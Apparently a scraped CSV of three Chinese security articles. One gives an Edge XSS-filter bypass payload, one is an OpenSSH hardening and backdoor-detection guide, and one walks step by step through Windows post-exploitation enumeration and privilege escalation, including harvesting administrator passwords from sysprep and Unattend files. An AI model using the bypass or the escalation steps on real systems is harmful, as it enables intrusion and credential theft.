{(v|(&amp;#x?0*((86)|(56)|(118)|(76));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*{(b|(&amp;#x?0*((66)|(42)|(98)|(62));?))}([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(s|(&amp;#x?0*((83)|(53)|(115)|(73));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*((c|(&amp;#x?0*((67)|(43)|(99)|(63));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(r|(&amp;#x?0*((82)|(52)|(114)|(72));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(i|(&amp;#x?0*((73)|(49)|(105)|(69));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(p|(&amp;#x?0*((80)|(50)|(112)|(70));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(t|(&amp;#x?0*((84)|(54)|(116)|(74));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*)?(:|(&amp;((#x?0*((58)|(3A));?)|(colon;)))).}{(j|(&amp;#x?0*((74)|(4A)|(106)|(6A));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(a|(&amp;#x?0*((65)|(41)|(97)|(61));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(v|(&amp;#x?0*((86)|(56)|(118)|(76));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(a|(&amp;#x?0*((65)|(41)|(97)|(61));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(s|(&amp;#x?0*((83)|(53)|(115)|(73));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(c|(&amp;#x?0*((67)|(43)|(99)|(63));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*{(r|(&amp;#x?0*((82)|(52)|(114)|(72));?))}([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(i|(&amp;#x?0*((73)|(49)|(105)|(69));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(p|(&amp;#x?0*((80)|(50)|(112)|(70));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(t|(&amp;#x?0*((84)|(54)|(116)|(74));?))([\t]|(&amp;((#x?0*(9|(13)|(10)|A|D);?)|(tab;)|(newline;))))*(:|(&amp;((#x?0*((58)|(3A));?)|(colon;)))).}目前 Edge 已经支持 ES6 并且有了一些非常有用的新功能。但 ES6 的计算特性允许你通过一个表达式来计算属性的名称，例如：x='a';o={[x]:123};alert(o.a)至此我想你应该知道要怎么办了吧。通过将这两种技术结合就可以绕过 Edge XSS 过滤器。之前说过正则表达式会匹配 toString/valueOf，但不幸的是我们可以利用计算特性来混淆它们。x='g',y='f',{['toStrin'+x]:[].join,length:1,0:'java\script:alert\x28123\x29',['valueO'+y]:location}-'';POC 地址","2016-07-28 22:51:06","Web安全","如何绕过Edge XSS过滤器？","http://nsoad.com/Article/web/20160728/54.html"
"5ccbfac64f2f0a0a7a69c0c0","SSH 是建立在应用层基础上的安全协议，是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。","悬镜安全","本篇文章是悬镜安全实验室推出的第10篇原创安全技术文章SSH 是建立在应用层基础上的安全协议，是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。我们常用的OpenSSH就是SSH协议的开源实现。IETF RFC 4251 到 4256 将 SSH 定义为 “经由一个不安全网络进行远程登录和其他安全网络服务的安全 shell 协议”。shell 由三个主要元素组成。传输层协议：提供服务器身份验证、隐私和具有完美转发隐私的完整性。该层可以提供可选压缩且通过一个 TCP/IP 连接运行，但是也可用于任何其他可靠的数据流之上。用户认证协议：从服务器到客户端进行身份验证，且通过传输层运行。连接协议：多路传输加密隧道到多个逻辑通道，通过用户认证协议运行。下面我们来看看如何让我们的OpenSSH更安全。一、基础配置，服务端配置文件为/etc/ssh/sshd_config1、将 root 账户仅限制为控制台访问PermitRootLogin no2、仅使用 SSH Protocol 23、禁用空密码PermitEmptyPasswords no4、用户登录控制AllowUsers user1@host1 user1@!* *@*DenyUsers user25、配置 Idle Log Out Timeout 间隔ClientAliveInterval 300ClientAliveCountMax 06、禁用基于主机的身份验证HostbasedAuthentication no7、禁用用户的 .rhosts 文件   IgnoreRhosts yes8、强密码策略（生成14位随机字符密码）9、pam_chroot通过ssh远程登录的用户将被限制在jail环境中。10、访问控制tcpwrapper(/etc/hosts.allow，/etc/hosts.deny)iptables（限制源IP等）二、攻防对抗一旦攻击者获取了相关权限，就可能安装openssh后门、或者隐身登录等。接下来我们看看如何让攻击者无所遁形。1、隐身登录（登录后，不能通过w、who查看到）     通过ssh –T来连接，但-T相当于notty，ctrl+C会中断会话；     另外，大家都知道，w查看时是通过utmp二进制log，如果攻击者在获取权限后，只要修改了utmp，就可以达到隐身效果，管理员再登录上来的时候，通过w、who就看不到已经登录的攻击者了，如下所示。当然，这样操作会造成整个utmp为空，如果是在管理员登录之后再操作的话，还是会发现异常的。同时也要处理下wtmp，否则还是会被审计到。那么如何快递排查呢，我们可以通过ps命令查看进程，如下图所示。我们可以看到当攻击者处理掉自己的记录后，管理员虽然通过w、who看不到，但是进程中却存在着攻击者登录申请的TTY。以上只是简单的隐藏，通常情况下，攻击者获取权限后，会安装openssh后门，成功运行后门后，攻击者通过后门登录将不记录任何日志，正常用户登录该主机或者通过该主机通过ssh连接其他主机时，都会被后门记录到账号密码。这里我们介绍如何利用操作系统自身的工具手工快速查找后门，主要用到strace、strings、grep。通过openssh后门功能中会记录正常用户登录账号密码，因此猜测会用到open系统调用，只要在登录是用strace跟踪sshd打开的系统调用，然后过滤open，就应该能获取到记录密码的文件及路径。strace –o ssh –ff –p pid可以看到记录文件中关键字为user:password，而且因为后门密码是硬编码在后门patch中的，因此我们通过关键字利用strings可以找到攻击者的openssh后门密码。如果安全意识不高的攻击者使用了自己攻击机器的通用密码，通过抓包获取到攻击者攻击IP后，就有可能控制攻击者的机器。（意淫）攻击者通过openssh后门登录后，w、who同样看不到登录信息，但ps查看进程，仍然可以看到申请到的TTY，也可以快速发现攻击行为。以上只是最基础一些小tips，欢迎各位大佬拍砖。本篇文章为悬镜安全实验室原创文章，如需转载请标注来源：http://lab.xmirror.cn/。悬镜安全实验室由资深安全专家结合多年的安全工程实施经验和技术储备为行业客户提供专业的安全保障和安全咨询等服务，主要包括：服务器防黑加固、高级渗透测试、安全事件应急响应、信息系统安全风险评估、安卓App风险评估及APT模拟攻击测试等，全天候7*24位金融、电商、开发者和政企客户的各类应用服务提供一站式【云+端】防黑加固解决方案。","2017-11-08 11:05:49","系统安全","Linux安全运维丨OpenSSH安全浅析","http://nsoad.com/Article/system/20171108/1179.html"
"5ccbfac64f2f0a0a7a69c0c1","0&times;01 meterpreter简介MetasploitFramework是一个缓冲区溢出测试使用的辅助工具，也可以说是一个漏洞利用和测试平台，它集成了各种平台上常见的溢出漏洞和流行的shell","Kong","从t0到t3 - 信息搜集一开始，我们拥有的帐号是一个没有特权的普通账号。假设我们已经在远程或者在本地利用EXP进行了一次攻击并且获得了一个反弹回来的shell。根本上说，在时间t0，我们不知道被攻击的机器是做什么的，它和谁进行连接，我们拥有怎样的权限，甚至它的操作系统是哪个。因此，开始的时候，我们就需要快速的搜集一些至关重要的信息，这样我们就可以了解一下我们所处环境的情况。首先，先看看我们连接的什么类型的操作系统C:\Windows\system32&gt; systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""OS Name:                   Microsoft Windows 7 ProfessionalOS Version:                6.1.7601 Service Pack 1 Build 7601注：中文环境下，""OS Name""为""OS 名称""，""OS Version""为""OS 版本""接着，看下计算机名和我们使用的用户C:\Windows\system32&gt; hostnameb33fC:\Windows\system32&gt; echo %username%user1现在我们有了基本的信息，接下来我们可以列出计算机上的其它用户，并且可以看一下我们当前用户的详细信息。从下面的结果可以看出，user1不是本地用户组Administrators的成员。C:\Windows\system32&gt; net usersUser accounts for \\B33F-------------------------------------------------------------------------------Administrator            b33f                     Guestuser1The command completed successfully.C:\Windows\system32&gt; net user user1User name                    user1Full NameCommentUser's commentCountry code                 000 (System Default)Account active               YesAccount expires              NeverPassword last set            1/11/2014 7:47:14 PMPassword expires             NeverPassword changeable          1/11/2014 7:47:14 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   1/11/2014 8:05:09 PMLogon hours allowed          AllLocal Group Memberships      *UsersGlobal Group memberships     *NoneThe command completed successfully.这是我们暂时需要了解的关于用户的所有信息。接下来我们需要从网络方面搜集信息了。首先，看一下网络连接和路由表。C:\Windows\system32&gt; ipconfig /allWindows IP Configuration   Host Name . . . . . . . . . . . . : b33f   Primary Dns Suffix  . . . . . . . :   Node Type . . . . . . . . . . . . : Hybrid   IP Routing Enabled. . . . . . . . : No   WINS Proxy Enabled. . . . . . . . : NoEthernet adapter Bluetooth Network Connection:   Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . :   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29   DHCP Enabled. . . . . . . . . . . : Yes   Autoconfiguration Enabled . . . . : YesEthernet adapter Local Area Connection:   Connection-specific DNS Suffix  . :   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection   Physical Address. . . . . . . . . : 00-0C-29-56-79-35   DHCP Enabled. . . . . . . . . . . : Yes   Autoconfiguration Enabled . . . . : Yes   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM   Default Gateway . . . . . . . . . : 192.168.0.1   DHCP Server . . . . . . . . . . . : 192.168.0.1   DHCPv6 IAID . . . . . . . . . . . : 234884137   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35   DNS Servers . . . . . . . . . . . : 192.168.0.1   NetBIOS over Tcpip. . . . . . . . : EnabledC:\Windows\system32&gt; route print===========================================================================Interface List 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network) 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection  1...........................Software Loopback Interface 1 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter \#2 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter \#3 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface===========================================================================IPv4 Route Table===========================================================================Active Routes:Network Destination        Netmask          Gateway       Interface  Metric          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266===========================================================================Persistent Routes:  NoneIPv6 Route Table===========================================================================Active Routes: If Metric Network Destination      Gateway 14     58 ::/0                     On-link  1    306 ::1/128                  On-link 14     58 2001::/32                On-link 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128                                    On-link 11    266 fe80::/64                On-link 14    306 fe80::/64                On-link 14    306 fe80::8d2:b4e:3f57:ff97/128                                    On-link 11    266 fe80::5cd4:9caf:61c0:ba6e/128                                    On-link  1    306 ff00::/8                 On-link 14    306 ff00::/8                 On-link 11    266 ff00::/8                 On-link===========================================================================Persistent Routes:  Nonearp -A 展示了ARP缓存表.C:\Windows\system32&gt; arp -AInterface: 192.168.0.104 --- 0xb  Internet Address      Physical Address      Type  192.168.0.1           90-94-e4-c5-b0-46     dynamic  192.168.0.101         ac-22-0b-af-bb-43     dynamic  192.168.0.255         ff-ff-ff-ff-ff-ff     static  224.0.0.22            01-00-5e-00-00-16     static  224.0.0.251           01-00-5e-00-00-fb     static  224.0.0.252           01-00-5e-00-00-fc     static  239.255.255.250       01-00-5e-7f-ff-fa     static  255.255.255.255       ff-ff-ff-ff-ff-ff     static下面可以看到活动的网络连接和防火墙规则C:\Windows\system32&gt; netstat -anoActive Connections  Proto  Local Address          Foreign Address        State           PID  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4  TCP    [::]:135               [::]:0                 LISTENING       684  TCP    [::]:445               [::]:0                 LISTENING       4  TCP    [::]:5357              [::]:0                 LISTENING       4  UDP    0.0.0.0:5355           *:*                                    1100  UDP    0.0.0.0:52282          *:*                                    976  UDP    0.0.0.0:55202          *:*                                    2956  UDP    0.0.0.0:59797          *:*                                    1400  UDP    127.0.0.1:1900         *:*                                    2956  UDP    127.0.0.1:65435        *:*                                    2956  UDP    192.168.0.104:137      *:*                                    4  UDP    192.168.0.104:138      *:*                                    4  UDP    192.168.0.104:1900     *:*                                    2956  UDP    192.168.0.104:5353     *:*                                    1400  UDP    192.168.0.104:65434    *:*                                    2956  UDP    [::]:5355              *:*                                    1100  UDP    [::]:52281             *:*                                    976  UDP    [::]:52283             *:*                                    976  UDP    [::]:55203             *:*                                    2956  UDP    [::]:59798             *:*                                    1400  UDP    [::1]:1900             *:*                                    2956  UDP    [::1]:5353             *:*                                    1400  UDP    [::1]:65433            *:*                                    2956  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956接下来的两个netsh命令是不能在所有操作系统都通用的命令的例子，netsh firewall命令只能在XP SP2及其以上版本的操作系统使用。C:\Windows\system32&gt; netsh firewall show stateFirewall status:-------------------------------------------------------------------Profile                           = StandardOperational mode                  = EnableException mode                    = EnableMulticast/broadcast response mode = EnableNotification mode                 = EnableGroup policy version              = Windows FirewallRemote admin mode                 = DisablePorts currently open on all network interfaces:Port   Protocol  Version  Program-------------------------------------------------------------------No ports are currently open on all network interfaces.C:\Windows\system32&gt; netsh firewall show configDomain profile configuration:-------------------------------------------------------------------Operational mode                  = EnableException mode                    = EnableMulticast/broadcast response mode = EnableNotification mode                 = EnableAllowed programs configuration for Domain profile:Mode     Traffic direction    Name / Program-------------------------------------------------------------------Port configuration for Domain profile:Port   Protocol  Mode    Traffic direction     Name-------------------------------------------------------------------ICMP configuration for Domain profile:Mode     Type  Description-------------------------------------------------------------------Enable   2     Allow outbound packet too bigStandard profile configuration (current):-------------------------------------------------------------------Operational mode                  = EnableException mode                    = EnableMulticast/broadcast response mode = EnableNotification mode                 = EnableService configuration for Standard profile:Mode     Customized  Name-------------------------------------------------------------------Enable   No          Network DiscoveryAllowed programs configuration for Standard profile:Mode     Traffic direction    Name / Program-------------------------------------------------------------------Enable   Inbound              COMRaider / E:\comraider\comraider.exeEnable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exePort configuration for Standard profile:Port   Protocol  Mode    Traffic direction     Name-------------------------------------------------------------------ICMP configuration for Standard profile:Mode     Type  Description-------------------------------------------------------------------Enable   2     Allow outbound packet too bigLog configuration:-------------------------------------------------------------------File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.logMax file size   = 4096 KBDropped packets = DisableConnections     = Disable最后，我们大概的看一下计算机上的：计划任务，正在运行的进程，启动的服务，安装的驱动程序。这条命令将详细的展示出所有的计划任务：C:\Windows\system32&gt; schtasks /query /fo LIST /vFolder: \Microsoft\Windows DefenderHostName:                             B33FTaskName:                             \Microsoft\Windows Defender\MP Scheduled ScanNext Run Time:                        1/22/2014 5:11:13 AMStatus:                               ReadyLogon Mode:                           Interactive/BackgroundLast Run Time:                        N/ALast Result:                          1Author:                               N/ATask To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob                                      -WinTask -RestrictPrivilegesScanStart In:                             N/AComment:                              Scheduled ScanScheduled Task State:                 EnabledIdle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutesPower Management:                     No Start On BatteriesRun As User:                          SYSTEMDelete Task If Not Rescheduled:       EnabledStop Task If Runs X Hours and X Mins: 72:00:00Schedule:                             Scheduling data is not available in this format.Schedule Type:                        DailyStart Time:                           5:11:13 AMStart Date:                           1/1/2000End Date:                             1/1/2100Days:                                 Every 1 day(s)Months:                               N/ARepeat: Every:                        DisabledRepeat: Until: Time:                  DisabledRepeat: Until: Duration:              DisabledRepeat: Stop If Still Running:        Disabled[..Snip..]下面的这条命令将正在运行的进程和该进程启动的服务列了出来：C:\Windows\system32&gt; tasklist /SVCImage Name                     PID Services========================= ======== ============================================System Idle Process              0 N/ASystem                           4 N/Asmss.exe                       244 N/Acsrss.exe                      332 N/Acsrss.exe                      372 N/Awininit.exe                    380 N/Awinlogon.exe                   428 N/Aservices.exe                   476 N/Alsass.exe                      484 SamSslsm.exe                        496 N/Asvchost.exe                    588 DcomLaunch, PlugPlay, Powersvchost.exe                    668 RpcEptMapper, RpcSssvchost.exe                    760 Audiosrv, Dhcp, eventlog,                                   HomeGroupProvider, lmhosts, wscsvcsvchost.exe                    800 AudioEndpointBuilder, CscService, Netman,                                   SysMain, TrkWks, UxSms, WdiSystemHost,                                   wudfsvcsvchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,                                   LanmanServer, MMCSS, ProfSvc, Schedule,                                   seclogon, SENS, ShellHWDetection, Themes,                                   Winmgmt, wuauservaudiodg.exe                    916 N/Asvchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,                                   WdiServiceHost, WinHttpAutoProxySvcsvchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,                                   NlaSvcspoolsv.exe                   1244 Spoolersvchost.exe                   1272 BFE, DPS, MpsSvcmDNSResponder.exe             1400 Bonjour Servicetaskhost.exe                  1504 N/Ataskeng.exe                   1556 N/Avmtoolsd.exe                  1580 VMToolsdwm.exe                       1660 N/Aexplorer.exe                  1668 N/Avmware-usbarbitrator.exe      1768 VMUSBArbServiceTPAutoConnSvc.exe             1712 TPAutoConnSvc[..Snip..]C:\Windows\system32&gt; net startThese Windows services are started:   Application Experience   Application Information   Background Intelligent Transfer Service   Base Filtering Engine   Bluetooth Support Service   Bonjour Service   COM+ Event System   COM+ System Application   Cryptographic Services   DCOM Server Process Launcher   Desktop Window Manager Session Manager   DHCP Client   Diagnostic Policy Service   Diagnostic Service Host   Diagnostic System Host   Distributed Link Tracking Client   Distributed Transaction Coordinator   DNS Client   Function Discovery Provider Host   Function Discovery Resource Publication   Group Policy Client[..Snip..]这有时是有用的，一些第三方驱动程序,即使是有信誉的公司,也可能有比瑞士奶酪上的孔还多的的漏洞。这仅仅是有可能的,因为对ring0攻击在大多数人专业技能之外。C:\Windows\system32&gt; DRIVERQUERYModule Name  Display Name           Driver Type   Link Date============ ====================== ============= ======================1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PMACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PMAcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PMadp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AMadpahci      adpahci                Kernel        5/2/2007 1:29:26 AMadpu320      adpu320                Kernel        2/28/2007 8:03:08 AMAFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PMagp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AMaic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AMaliide       aliide                 Kernel        7/14/2009 7:11:17 AMamdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AMamdide       amdide                 Kernel        7/14/2009 7:11:19 AMAmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AMAmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AMamdsata      amdsata                Kernel        3/19/2010 9:08:27 AMamdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AMamdxata      amdxata                Kernel        3/20/2010 12:19:01 AMAppID        AppID Driver           Kernel        11/20/2010 5:29:48 PMarc          arc                    Kernel        5/25/2007 5:31:06 AM[..Snip..]t4 - WMIC的神秘艺术我在这里单独的拿出WMIC(Windows Management Instrumentation Command-Line)来讲解，是因为它是Windows平台下最有用的命令行工具。WMIC在信息搜集和后渗透测试阶段非常实用。话虽这么说，其实它是有一点笨重的，因为它有时候会输出比我们需要的信息更多的信息。要完全讲完WMIC的使用，要耗费很长的时间。还有不得不提的是，一些输出可能会因为它的格式，很难在命令行下完美的展示出来。在这里安利两个WMIC的教程：[Command-Line Ninjitsu (SynJunkie)][Windows WMIC Command Line (ComputerHope)]不幸的是，一些windows默认的配置是不允许使用WMIC命令的，除非你是管理员组成员。经过我的测试，在XP下低权限用户是不能使用WMIC命令，但是在Windows 7 和Windows 8下，低权限用户可以使用WMIC，且不用更改任何设置。这正是我们使用WMIC搜集目标机器信息的前提。下面是WMIC的命令行帮助：C:\Windows\system32&gt; wmic /?[global switches] The following global switches are available:/NAMESPACE           Path for the namespace the alias operate against./ROLE                Path for the role containing the alias definitions./NODE                Servers the alias will operate against./IMPLEVEL            Client impersonation level./AUTHLEVEL           Client authentication level./LOCALE              Language id the client should use./PRIVILEGES          Enable or disable all privileges./TRACE               Outputs debugging information to stderr./RECORD              Logs all input commands and output./INTERACTIVE         Sets or resets the interactive mode./FAILFAST            Sets or resets the FailFast mode./USER                User to be used during the session./PASSWORD            Password to be used for session login./OUTPUT              Specifies the mode for output redirection./APPEND              Specifies the mode for output redirection./AGGREGATE           Sets or resets aggregate mode./AUTHORITY           Specifies the  for the connection./?[:&lt;BRIEF|FULL&gt;]    Usage information.For more information on a specific global switch, type: switch-name /?The following alias/es are available in the current role:ALIAS                    - Access to the aliases available on the local systemBASEBOARD                - Base board (also known as a motherboard or system board) management.BIOS                     - Basic input/output services (BIOS) management.BOOTCONFIG               - Boot configuration management.CDROM                    - CD-ROM management.COMPUTERSYSTEM           - Computer system management.CPU                      - CPU management.CSPRODUCT                - Computer system product information from SMBIOS.DATAFILE                 - DataFile Management.DCOMAPP                  - DCOM Application management.DESKTOP                  - User's Desktop management.DESKTOPMONITOR           - Desktop Monitor management.DEVICEMEMORYADDRESS      - Device memory addresses management.DISKDRIVE                - Physical disk drive management.DISKQUOTA                - Disk space usage for NTFS volumes.DMACHANNEL               - Direct memory access (DMA) channel management.ENVIRONMENT              - System environment settings management.FSDIR                    - Filesystem directory entry management.GROUP                    - Group account management.IDECONTROLLER            - IDE Controller management.IRQ                      - Interrupt request line (IRQ) management.JOB                      - Provides  access to the jobs scheduled using the schedule service.LOADORDER                - Management of system services that define execution dependencies.LOGICALDISK              - Local storage device management.LOGON                    - LOGON Sessions.MEMCACHE                 - Cache memory management.MEMORYCHIP               - Memory chip information.MEMPHYSICAL              - Computer system's physical memory management.NETCLIENT                - Network Client management.NETLOGIN                 - Network login information (of a particular user) management.NETPROTOCOL              - Protocols (and their network characteristics) management.NETUSE                   - Active network connection management.NIC                      - Network Interface Controller (NIC) management.NICCONFIG                - Network adapter management.NTDOMAIN                 - NT Domain management.NTEVENT                  - Entries in the NT Event Log.NTEVENTLOG               - NT eventlog file management.ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).OS                       - Installed Operating System/s management.PAGEFILE                 - Virtual memory file swapping management.PAGEFILESET              - Page file settings management.PARTITION                - Management of partitioned areas of a physical disk.PORT                     - I/O port management.PORTCONNECTOR            - Physical connection ports management.PRINTER                  - Printer device management.PRINTERCONFIG            - Printer device configuration management.PRINTJOB                 - Print job management.PROCESS                  - Process management.PRODUCT                  - Installation package task management.QFE                      - Quick Fix Engineering.QUOTASETTING             - Setting information for disk quotas on a volume.RDACCOUNT                - Remote Desktop connection permission management.RDNIC                    - Remote Desktop connection management on a specific network adapter.RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.RECOVEROS                - Information that will be gathered from memory when the operating system fails.REGISTRY                 - Computer system registry management.SCSICONTROLLER           - SCSI Controller management.SERVER                   - Server information management.SERVICE                  - Service application management.SHADOWCOPY               - Shadow copy management.SHADOWSTORAGE            - Shadow copy storage area management.SHARE                    - Shared resource management.SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement.SOUNDDEV                 - Sound Device management.STARTUP                  - Management of commands that run automatically when users log onto the computer                            system.SYSACCOUNT               - System account management.SYSDRIVER                - Management of the system driver for a base service.SYSTEMENCLOSURE          - Physical system enclosure management.SYSTEMSLOT               - Management of physical connection points including ports,  slots and                            peripherals, and proprietary connections points.TAPEDRIVE                - Tape drive management.TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).TIMEZONE                 - Time zone data management.UPS                      - Uninterruptible power supply (UPS) management.USERACCOUNT              - User account management.VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.VOLUME                   - Local storage volume management.VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume.VOLUMEUSERQUOTA          - Per user storage volume quota management.WMISET                   - WMI service operational parameters management.For more information on a specific alias, type: alias /?CLASS     - Escapes to full WMI schema.PATH      - Escapes to full WMI object paths.CONTEXT   - Displays the state of all the global switches.QUIT/EXIT - Exits the program.For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?为了省时省力，我写了一个可以放在目标机器上，调用WMIC来提取下面信息（进程，服务，用户，用户组，网络连接，硬盘信息，网络共享信息，已安装补丁，启动项，已安装的软件，操作系统的相关信息，和时区）的脚本。[下载点我]从t5到t6 - 快速攻陷在继续之前，你需要先看一下你已经搜集到的信息，下一步就是要寻找一下能被利用的系统缺陷来提升我们的权限。首先我们要看的是是补丁修正情况，我的WMIC脚本可以列出已安装的补丁，但是你也可以通过下面这条命令来查看：C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOnCaption                                     Description      HotFixID   InstalledOnhttp://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013[..Snip..]这些输出的结果是不能直接被利用的，最好的方式是去找权限提升的EXP并且将这些编号与EXP编号进行对比。这些EXP包括，但不限于：KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)。如果有许多机器需要被安装，通常，一个技术员不会挨个机器手动装机。有一些自动安装的解决方案。这些方案是什么以及它们是如何工作的对我们的目的不重要，重要的是他们留下的用于安装过程的配置文件，这些安装文件包含大量的敏感信息，例如操作系统的产品密钥和管理员的密码。我们最感兴趣的就是管理员密码，因为我们可以用它来提升我们的权限。通常的，这些目录包含这些配置文件（检查整个系统的所有文件也是不错想法）：c:\sysprep.infc:\sysprep\sysprep.xml%WINDIR%\Panther\Unattend\Unattended.xml%WINDIR%\Panther\Unattended.xml这些文件要么包含着明文密码，要么就是Base64加密后的密码。下面是一个例子：sysprep.inf 